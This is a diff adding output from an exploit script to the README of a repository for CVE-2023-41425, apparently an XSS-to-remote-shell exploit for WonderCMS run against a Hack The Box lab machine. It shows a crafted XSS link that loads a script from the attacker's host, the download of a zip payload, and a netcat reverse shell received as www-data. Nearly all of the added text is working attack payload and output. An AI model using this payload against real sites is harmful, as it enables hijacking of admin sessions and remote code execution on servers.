@@ -235,3 +235,45 @@ SOFTWARE.
 
 CVE:
 https://github.com/insomnia-jacob/CVE-2023-41425
+
+exploit.py output:
+```bash
+================================================================
+        # Autor      : Insomnia (Jacob S.)
+        # IG         : insomnia.py
+        # X          : @insomniadev_
+        # Github     : https://github.com/insomnia-jacob
+================================================================          
+ 
+[+]The zip file will be downloaded from the host:    http://10.10.14.46:8000/main.zip
+ 
+[+] File created:  xss.js
+ 
+[+] Set up nc to listen on your terminal for the reverse shell
+	Use:
+		   nc -nvlp 4321 
+ 
+[+] Send the below link to admin:
+
+	 http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.46:8000/xss.js"></script><form+action=" 
+
+Starting HTTP server with Python3, waiting for the XSS request
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.3.193 - - [03/Oct/2024 23:07:13] "GET /xss.js HTTP/1.1" 200 -
+10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
+10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
+10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
+10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
+```
+
+netcat output:
+```bash
+listening on [any] 4321 ...
+connect to [10.10.14.46] from (UNKNOWN) [10.129.3.193] 49352
+Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 04:07:24 up 23:12,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
